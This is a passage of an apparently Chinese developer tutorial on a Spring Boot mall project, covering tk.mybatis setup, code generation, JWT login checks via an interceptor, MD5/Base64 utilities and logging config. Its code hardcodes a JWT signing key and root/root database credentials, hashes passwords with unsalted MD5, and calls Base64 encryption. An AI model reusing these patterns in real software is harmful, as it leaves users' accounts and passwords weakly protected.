      <span class="hljs-attr">username:</span> <span class="hljs-string">root</span>
      <span class="hljs-attr">password:</span> <span class="hljs-string">root</span>
      <span class="hljs-attr">url:</span> <span class="hljs-string">jdbc:mysql://localhost:3306/fmmall?characterEncoding=utf-8&amp;useSSL=false</span>
<span class="hljs-attr">mybatis:</span>
  <span class="hljs-attr">mapper-locations:</span> <span class="hljs-string">classpath:mapper/*Mapper.xml</span>
  <span class="hljs-attr">type-aliases-package:</span> <span class="hljs-string">com.sunzy.fmmall.dao</span></code></pre>

<h2 id="3-修改启动类"><a href="#3-修改启动类" class="headerlink" title="3.修改启动类"></a>3.修改启动类</h2><p>注意MapperScan需要使用tkmapper包中的</p>
<pre><code class="hljs java"><span class="hljs-keyword">package</span> com.sunzy.tkmapper;

<span class="hljs-comment">//import org.mybatis.spring.annotation.MapperScan;</span>
<span class="hljs-keyword">import</span> org.springframework.boot.SpringApplication;
<span class="hljs-keyword">import</span> org.springframework.boot.autoconfigure.SpringBootApplication;
<span class="hljs-keyword">import</span> tk.mybatis.spring.annotation.MapperScan;

<span class="hljs-meta">@SpringBootApplication</span>
<span class="hljs-comment">//@MapperScan(&quot;com.sunzy.tkmapper.dao&quot;)</span>
<span class="hljs-meta">@MapperScan(&quot;com.sunzy.tkmapper.dao&quot;)</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TkmapperDemoApplication</span> &#123;

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;
        SpringApplication.run(TkmapperDemoApplication.class, args);
    &#125;

&#125;
</code></pre>

<h2 id="4-逆向工程"><a href="#4-逆向工程" class="headerlink" title="4.逆向工程"></a>4.逆向工程</h2><p>导入插件依赖</p>
<pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">plugin</span>&gt;</span>
               <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.mybatis.generator<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
               <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>mybatis-generator-maven-plugin<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
               <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.3.5<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
               <span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span>
                   <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
                       <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>mysql<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
                       <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>mysql-connector-java<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
                       <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>5.1.47<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
                   <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
                   <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
                       <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>tk.mybatis<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
                       <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>mapper<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
                       <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.4.4<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
                   <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
               <span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span>
           <span class="hljs-tag">&lt;/<span class="hljs-name">plugin</span>&gt;</span></code></pre>

<p>添加配置文件GeneratorConfig.xml</p>
<p>记得修改对应包名<code>&lt;!--**--&gt;</code>标记处需要修改</p>
<pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span>
<span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">generatorConfiguration</span></span>
<span class="hljs-meta">        <span class="hljs-keyword">PUBLIC</span> <span class="hljs-string">&quot;-//mybatis.org//DTD MyBatis Generator Configuration</span></span>
<span class="hljs-string"><span class="hljs-meta">1.0//EN&quot;</span></span>
<span class="hljs-meta">        <span class="hljs-string">&quot;http://mybatis.org/dtd/mybatis-generator-config_1_0.dtd&quot;</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">generatorConfiguration</span>&gt;</span>
    <span class="hljs-comment">&lt;!-- 引⼊数据库连接配置 --&gt;</span>
    <span class="hljs-comment">&lt;!-- &lt;properties resource=&quot;jdbc.properties&quot;/&gt;--&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">context</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;Mysql&quot;</span> <span class="hljs-attr">targetRuntime</span>=<span class="hljs-string">&quot;MyBatis3Simple&quot;</span></span>
<span class="hljs-tag">             <span class="hljs-attr">defaultModelType</span>=<span class="hljs-string">&quot;flat&quot;</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;beginningDelimiter&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;`&quot;</span>/&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;endingDelimiter&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;`&quot;</span>/&gt;</span>
        <span class="hljs-comment">&lt;!-- 配置 GeneralDAO --&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">plugin</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;tk.mybatis.mapper.generator.MapperPlugin&quot;</span>&gt;</span> 
            <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;mappers&quot;</span></span>
<span class="hljs-tag">                      <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;com.sunzy.fmmall.general.GeneralDao&quot;</span>/&gt;</span><span class="hljs-comment">&lt;!--**--&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">plugin</span>&gt;</span>
        <span class="hljs-comment">&lt;!-- 配置数据库连接 --&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">jdbcConnection</span> <span class="hljs-attr">driverClass</span>=<span class="hljs-string">&quot;com.mysql.jdbc.Driver&quot;</span></span>
<span class="hljs-tag">                        <span class="hljs-attr">connectionURL</span>=<span class="hljs-string">&quot;jdbc:mysql://localhost:3306/fmmall?useSSL=false&quot;</span> </span>
<span class="hljs-tag">                        <span class="hljs-attr">userId</span>=<span class="hljs-string">&quot;root&quot;</span> <span class="hljs-attr">password</span>=<span class="hljs-string">&quot;root&quot;</span>&gt;</span><span class="hljs-comment">&lt;!--**--&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">jdbcConnection</span>&gt;</span>
        <span class="hljs-comment">&lt;!-- 配置实体类存放路径 --&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">javaModelGenerator</span></span>
<span class="hljs-tag">                <span class="hljs-attr">targetPackage</span>=<span class="hljs-string">&quot;com.sunzy.fmmall.entity&quot;</span></span>
<span class="hljs-tag">                <span class="hljs-attr">targetProject</span>=<span class="hljs-string">&quot;src/main/java&quot;</span>/&gt;</span>   <span class="hljs-comment">&lt;!--**--&gt;</span>
        <span class="hljs-comment">&lt;!-- 配置 XML 存放路径 --&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">sqlMapGenerator</span> <span class="hljs-attr">targetPackage</span>=<span class="hljs-string">&quot;/&quot;</span></span>
<span class="hljs-tag">                         <span class="hljs-attr">targetProject</span>=<span class="hljs-string">&quot;src/main/resources/mapper&quot;</span>/&gt;</span> <span class="hljs-comment">&lt;!--**--&gt;</span>
        <span class="hljs-comment">&lt;!-- 配置 DAO 存放路径 --&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">javaClientGenerator</span> <span class="hljs-attr">targetPackage</span>=<span class="hljs-string">&quot;com.sunzy.fmmall.dao&quot;</span></span>
<span class="hljs-tag">                             <span class="hljs-attr">targetProject</span>=<span class="hljs-string">&quot;src/main/java&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;XMLMAPPER&quot;</span>/&gt;</span>  <span class="hljs-comment">&lt;!--**--&gt;</span>
        <span class="hljs-comment">&lt;!-- 配置需要指定⽣成的数据库和表，% 代表所有表 --&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">table</span> <span class="hljs-attr">tableName</span>=<span class="hljs-string">&quot;%&quot;</span>&gt;</span>
            <span class="hljs-comment">&lt;!-- mysql 配置 --&gt;</span>
            <span class="hljs-comment">&lt;!-- &lt;generatedKey column=&quot;id&quot; sqlStatement=&quot;Mysql&quot;</span>
<span class="hljs-comment">            identity=&quot;true&quot;/&gt;--&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">table</span>&gt;</span>
        <span class="hljs-comment">&lt;!-- &lt;table tableName=&quot;tb_roles&quot;&gt;--&gt;</span>
        <span class="hljs-comment">&lt;!-- &amp;lt;!&amp;ndash; mysql 配置 &amp;ndash;&amp;gt;--&gt;</span>
        <span class="hljs-comment">&lt;!-- &lt;generatedKey column=&quot;roleid&quot; sqlStatement=&quot;Mysql&quot;</span>
<span class="hljs-comment">        identity=&quot;true&quot;/&gt;--&gt;</span>
        <span class="hljs-comment">&lt;!-- &lt;/table&gt;--&gt;</span>
        <span class="hljs-comment">&lt;!-- &lt;table tableName=&quot;tb_permissions&quot;&gt;--&gt;</span>
        <span class="hljs-comment">&lt;!-- &amp;lt;!&amp;ndash; mysql 配置 &amp;ndash;&amp;gt;--&gt;</span>
        <span class="hljs-comment">&lt;!-- &lt;generatedKey column=&quot;perid&quot; sqlStatement=&quot;Mysql&quot;</span>
<span class="hljs-comment">        identity=&quot;true&quot;/&gt;--&gt;</span>
        <span class="hljs-comment">&lt;!-- &lt;/table&gt;--&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">context</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">generatorConfiguration</span>&gt;</span></code></pre>

<p>创建<code>com.sunzy.fmmall.general.GeneralDao</code></p>
<pre><code class="hljs java"><span class="hljs-keyword">package</span> com.sunzy.fmmall.general;

<span class="hljs-keyword">import</span> tk.mybatis.mapper.common.Mapper;
<span class="hljs-keyword">import</span> tk.mybatis.mapper.common.MySqlMapper;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">GeneralDao</span>&lt;T&gt; <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Mapper</span>&lt;T&gt;, MySqlMapper&lt;T&gt; &#123;
&#125;
</code></pre>

<p>在pom.xml中添加配置文件的位置</p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220710225357498.png" alt="image-20220710225357498"></p>
<p>使用插件进行代码生成</p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220710225431382.png" alt="image-20220710225431382"></p>
<h1 id="JWT实现登录权限认证"><a href="#JWT实现登录权限认证" class="headerlink" title="JWT实现登录权限认证"></a>JWT实现登录权限认证</h1><h2 id="1-导入JWT依赖"><a href="#1-导入JWT依赖" class="headerlink" title="1.导入JWT依赖"></a>1.导入JWT依赖</h2><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.auth0<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>java-jwt<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.10.3<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>io.jsonwebtoken<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>jjwt<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>0.9.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span></code></pre>

<h2 id="2-生成对应的token并返回给前端"><a href="#2-生成对应的token并返回给前端" class="headerlink" title="2.生成对应的token并返回给前端"></a>2.生成对应的token并返回给前端</h2><pre><code class="hljs java"><span class="hljs-comment">// 验证成功则生成对应的token</span>
<span class="hljs-comment">// 使用jwt生成token</span>
<span class="hljs-type">JwtBuilder</span> <span class="hljs-variable">builder</span> <span class="hljs-operator">=</span> Jwts.builder();
Map&lt;String, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();
map.put(<span class="hljs-string">&quot;key1&quot;</span>, <span class="hljs-string">&quot;value2&quot;</span>);
map.put(<span class="hljs-string">&quot;key2&quot;</span>, <span class="hljs-string">&quot;value2&quot;</span>);
<span class="hljs-type">JwtBuilder</span> <span class="hljs-variable">jwtBuilder</span> <span class="hljs-operator">=</span> builder.setSubject(username)    <span class="hljs-comment">//设置subject</span>
    .setIssuedAt(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>())        <span class="hljs-comment">// 设置token生成的时间</span>
    .setId(user.getUserId() + <span class="hljs-string">&quot;&quot;</span>)        <span class="hljs-comment">// 设置userid为token的唯一id</span>
    .setClaims(map)                 <span class="hljs-comment">// map中可以存放用户的角色和权限信息</span>
    .setExpiration(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>(System.currentTimeMillis() + <span class="hljs-number">24</span> * <span class="hljs-number">60</span> * <span class="hljs-number">60</span> * <span class="hljs-number">1000</span> * <span class="hljs-number">2</span>))               <span class="hljs-comment">// 设置token的过期时间 为两天</span>
    .signWith(SignatureAlgorithm.HS256, <span class="hljs-string">&quot;sunzy123456&quot;</span>);<span class="hljs-comment">// 设置token的加密方式和加密密钥</span>

<span class="hljs-type">String</span> <span class="hljs-variable">token</span> <span class="hljs-operator">=</span> jwtBuilder.compact();   <span class="hljs-comment">// 获取token</span>
<span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ResultVO</span>(ResStatus.OK, token, user);</code></pre>

<h2 id="3-前端进行登录验证时获取对应的token"><a href="#3-前端进行登录验证时获取对应的token" class="headerlink" title="3.前端进行登录验证时获取对应的token"></a>3.前端进行登录验证时获取对应的token</h2><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220711172838166.png" alt="image-20220711172838166"></p>
<h2 id="4-JWT进行token解析"><a href="#4-JWT进行token解析" class="headerlink" title="4.JWT进行token解析"></a>4.JWT进行token解析</h2><pre><code class="hljs java"><span class="hljs-keyword">if</span>(token == <span class="hljs-literal">null</span> || <span class="hljs-string">&quot;&quot;</span>.equals(token))&#123;
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ResultVO</span>(ResStatus.NO, <span class="hljs-string">&quot;failed&quot;</span>, <span class="hljs-literal">null</span>);
&#125;<span class="hljs-keyword">else</span> &#123;
    <span class="hljs-type">JwtParser</span> <span class="hljs-variable">parser</span> <span class="hljs-operator">=</span> Jwts.parser();
    parser.setSigningKey(<span class="hljs-string">&quot;sunzy123456&quot;</span>); <span class="hljs-comment">// 密钥需要与加密时使用的一致</span>
    <span class="hljs-keyword">try</span>&#123;
        <span class="hljs-comment">// 如果token正确 且在有效期内 则解析正常否则会出现异常</span>
        Jws&lt;Claims&gt; claimsJws = parser.parseClaimsJws(token);
        <span class="hljs-type">Claims</span> <span class="hljs-variable">body</span> <span class="hljs-operator">=</span> claimsJws.getBody();  <span class="hljs-comment">// 获取token中的用户数据</span>
        <span class="hljs-type">String</span> <span class="hljs-variable">subject</span> <span class="hljs-operator">=</span> body.getSubject();  <span class="hljs-comment">// 获取token中发subject</span>
        <span class="hljs-type">String</span> <span class="hljs-variable">key1</span> <span class="hljs-operator">=</span> body.get(<span class="hljs-string">&quot;key1&quot;</span>, String.class);  <span class="hljs-comment">/// 获取添加在map中的值</span>
    &#125;<span class="hljs-keyword">catch</span>(UnsupportedJwtException e)&#123;
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ResultVO</span>(ResStatus.NO, <span class="hljs-string">&quot;token不合法请重新登录！&quot;</span>, <span class="hljs-literal">null</span>);
    &#125;<span class="hljs-keyword">catch</span>(ExpiredJwtException e)&#123;
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ResultVO</span>(ResStatus.NO, <span class="hljs-string">&quot;token已过期，请重新登录！&quot;</span>, <span class="hljs-literal">null</span>);
    &#125;
    <span class="hljs-keyword">catch</span> (Exception e)&#123;
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ResultVO</span>(ResStatus.NO, <span class="hljs-string">&quot;未知错误&quot;</span>, <span class="hljs-literal">null</span>);
    &#125;</code></pre>

<h2 id="5-使用拦截器验证token"><a href="#5-使用拦截器验证token" class="headerlink" title="5.使用拦截器验证token"></a>5.使用拦截器验证token</h2><ul>
<li><p>创建拦截器</p>
<pre><code class="hljs java"><span class="hljs-keyword">package</span> com.sunzy.fmmall.interceptor;

<span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;
<span class="hljs-keyword">import</span> com.sunzy.fmmall.vo.ResStatus;
<span class="hljs-keyword">import</span> com.sunzy.fmmall.vo.ResultVO;
<span class="hljs-keyword">import</span> io.jsonwebtoken.*;
<span class="hljs-keyword">import</span> org.springframework.context.annotation.Configuration;
<span class="hljs-keyword">import</span> org.springframework.stereotype.Component;
<span class="hljs-keyword">import</span> org.springframework.web.servlet.HandlerInterceptor;
<span class="hljs-keyword">import</span> org.springframework.web.servlet.ModelAndView;

<span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;
<span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;
<span class="hljs-keyword">import</span> java.io.IOException;
<span class="hljs-keyword">import</span> java.io.PrintWriter;

<span class="hljs-meta">@Component</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CheckTokenInterceptor</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">HandlerInterceptor</span> &#123;
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">preHandle</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response, Object handler)</span> <span class="hljs-keyword">throws</span> Exception &#123;
        <span class="hljs-type">String</span> <span class="hljs-variable">token</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;token&quot;</span>);

        <span class="hljs-keyword">if</span> (token == <span class="hljs-literal">null</span> || <span class="hljs-string">&quot;&quot;</span>.equals(token)) &#123;
            doResponse(response, <span class="hljs-string">&quot;请先登录！&quot;</span>);
            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
        &#125; <span class="hljs-keyword">else</span> &#123;
            <span class="hljs-type">JwtParser</span> <span class="hljs-variable">parser</span> <span class="hljs-operator">=</span> Jwts.parser();
            parser.setSigningKey(<span class="hljs-string">&quot;sunzy123456&quot;</span>); <span class="hljs-comment">// 密钥需要与加密时使用的一致</span>
            <span class="hljs-keyword">try</span> &#123;
                <span class="hljs-comment">// 如果token正确 且在有效期内 则解析正常否则会出现异常</span>
                Jws&lt;Claims&gt; claimsJws = parser.parseClaimsJws(token);
                <span class="hljs-type">Claims</span> <span class="hljs-variable">body</span> <span class="hljs-operator">=</span> claimsJws.getBody();  <span class="hljs-comment">// 获取token中的用户数据</span>
                <span class="hljs-type">String</span> <span class="hljs-variable">subject</span> <span class="hljs-operator">=</span> body.getSubject();  <span class="hljs-comment">// 获取token中发subject</span>
                <span class="hljs-type">String</span> <span class="hljs-variable">key1</span> <span class="hljs-operator">=</span> body.get(<span class="hljs-string">&quot;key1&quot;</span>, String.class);  <span class="hljs-comment">/// 获取添加在map中的值</span>
                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
            &#125; <span class="hljs-keyword">catch</span> (UnsupportedJwtException e) &#123;
                doResponse(response,<span class="hljs-string">&quot;token不合法，请重新登录！&quot;</span>);
            &#125; <span class="hljs-keyword">catch</span> (ExpiredJwtException e) &#123;
                doResponse(response,<span class="hljs-string">&quot;token已过期，请重新登录！&quot;</span>);
            &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;
                doResponse(response,<span class="hljs-string">&quot;未知错误！&quot;</span>);
            &#125;

            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
        &#125;
    &#125;

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span>  <span class="hljs-title function_">doResponse</span><span class="hljs-params">(HttpServletResponse response, String msg)</span> <span class="hljs-keyword">throws</span> IOException &#123;
        <span class="hljs-type">ResultVO</span> <span class="hljs-variable">resultVO</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ResultVO</span>(ResStatus.NO, msg, <span class="hljs-literal">null</span>);
        <span class="hljs-type">String</span> <span class="hljs-variable">string</span> <span class="hljs-operator">=</span> JSON.toJSONString(resultVO);
        response.setContentType(<span class="hljs-string">&quot;application/json&quot;</span>);
        response.setCharacterEncoding(<span class="hljs-string">&quot;utf-8&quot;</span>);
        <span class="hljs-type">PrintWriter</span> <span class="hljs-variable">writer</span> <span class="hljs-operator">=</span> response.getWriter();
        writer.write(string);
        writer.flush();
        writer.close();
    &#125;

&#125;
</code></pre>


</li>
<li><p>配置拦截器</p>
<pre><code class="hljs java"><span class="hljs-keyword">package</span> com.sunzy.fmmall.config;

<span class="hljs-keyword">import</span> com.sunzy.fmmall.interceptor.CheckTokenInterceptor;
<span class="hljs-keyword">import</span> org.springframework.beans.factory.annotation.Autowired;
<span class="hljs-keyword">import</span> org.springframework.context.annotation.Configuration;
<span class="hljs-keyword">import</span> org.springframework.web.servlet.config.annotation.InterceptorRegistry;
<span class="hljs-keyword">import</span> org.springframework.web.servlet.config.annotation.WebMvcConfigurer;

<span class="hljs-comment">/**</span>
<span class="hljs-comment"> * 拦截器的配置类</span>
<span class="hljs-comment"> */</span>
<span class="hljs-meta">@Configuration</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">InterceptorConfig</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">WebMvcConfigurer</span> &#123;

    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> CheckTokenInterceptor checkTokenInterceptor;

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addInterceptors</span><span class="hljs-params">(InterceptorRegistry registry)</span> &#123;
        <span class="hljs-comment">// registry是拦截器的注册器</span>
        <span class="hljs-comment">// 将自己创建的拦截器加入进来 即可实现拦截功能</span>
        registry.addInterceptor(checkTokenInterceptor)
        .addPathPatterns(<span class="hljs-string">&quot;/**&quot;</span>)  <span class="hljs-comment">// 拦截所有路径</span>
        .excludePathPatterns(<span class="hljs-string">&quot;/user/**&quot;</span>); <span class="hljs-comment">// 除了用户登录和注册路径</span>
    &#125;
&#125;
</code></pre></li>
</ul>
<h1 id="加密使用到工具类"><a href="#加密使用到工具类" class="headerlink" title="加密使用到工具类"></a>加密使用到工具类</h1><h2 id="1-md5"><a href="#1-md5" class="headerlink" title="1.md5"></a>1.md5</h2><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.qfedu.fmmall.utils;

<span class="hljs-keyword">import</span> java.math.BigInteger;
<span class="hljs-keyword">import</span> java.security.MessageDigest;
<span class="hljs-keyword">import</span> java.security.NoSuchAlgorithmException;

<span class="hljs-comment">//MD5 生成器</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MD5Utils</span> &#123;
	<span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">md5</span><span class="hljs-params">(String password)</span>&#123;
		<span class="hljs-comment">//生成一个md5加密器</span>
		<span class="hljs-keyword">try</span> &#123;
			<span class="hljs-type">MessageDigest</span> <span class="hljs-variable">md</span> <span class="hljs-operator">=</span> MessageDigest.getInstance(<span class="hljs-string">&quot;MD5&quot;</span>);
			<span class="hljs-comment">//计算MD5 的值</span>
			md.update(password.getBytes());
			<span class="hljs-comment">//BigInteger 将8位的字符串 转成16位的字符串 得到的字符串形式是哈希码值</span>
			<span class="hljs-comment">//BigInteger(参数1,参数2) 参数1 是 1为正数 0为0 -1为负数</span>
			<span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BigInteger</span>(<span class="hljs-number">1</span>, md.digest()).toString(<span class="hljs-number">16</span>);
		&#125; <span class="hljs-keyword">catch</span> (NoSuchAlgorithmException e) &#123;
			e.printStackTrace();
		&#125;
		<span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;
	&#125;
&#125;
</code></pre>

<h2 id="2-base64"><a href="#2-base64" class="headerlink" title="2.base64"></a>2.base64</h2><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.qfedu.fmmall.utils;

<span class="hljs-keyword">import</span> java.util.Base64;

<span class="hljs-comment">//base64 加密 解密 激活邮件的时候 为 邮箱地址 code验证码 进行加密</span>
<span class="hljs-comment">//当 回传回来后 进行邮箱地址 和 code 的解密</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Base64Utils</span> &#123;
	<span class="hljs-comment">//加密</span>
	<span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">encode</span><span class="hljs-params">(String msg)</span>&#123;
		<span class="hljs-keyword">return</span> Base64.getEncoder().encodeToString(msg.getBytes());
	&#125;
	<span class="hljs-comment">//解密</span>
	<span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">decode</span><span class="hljs-params">(String msg)</span>&#123;
		<span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(Base64.getDecoder().decode(msg));
	&#125;
&#125;
</code></pre>



<p>​	 </p>
<h1 id="logback日志"><a href="#logback日志" class="headerlink" title="logback日志"></a>logback日志</h1><h2 id="添加xml文件"><a href="#添加xml文件" class="headerlink" title="添加xml文件"></a>添加xml文件</h2><p>在springboot项目的resource目录下创建logback-spring.xml文件</p>
<pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">configuration</span>&gt;</span>

    <span class="hljs-tag">&lt;<span class="hljs-name">appender</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;stdout&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;ch.qos.logback.core.ConsoleAppender&quot;</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">encoder</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">springProfile</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;dev&quot;</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">pattern</span>&gt;</span>%d&#123;yyyy-MM-dd-HH:mm:ss E&#125; %level [%thread]-%class[%line]: %msg%n<span class="hljs-tag">&lt;/<span class="hljs-name">pattern</span>&gt;</span>
            <span class="hljs-tag">&lt;/<span class="hljs-name">springProfile</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">springProfile</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;!dev&quot;</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">pattern</span>&gt;</span>%d&#123;yyyy-MM-dd-HH:mm:ss E&#125; %level [%thread]-%class[%line]: %msg%n<span class="hljs-tag">&lt;/<span class="hljs-name">pattern</span>&gt;</span>
            <span class="hljs-tag">&lt;/<span class="hljs-name">springProfile</span>&gt;</span>
            <span class="hljs-comment">&lt;!--日志的编码格式--&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">charset</span>&gt;</span>UTF-8<span class="hljs-tag">&lt;/<span class="hljs-name">charset</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">encoder</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">appender</span>&gt;</span>

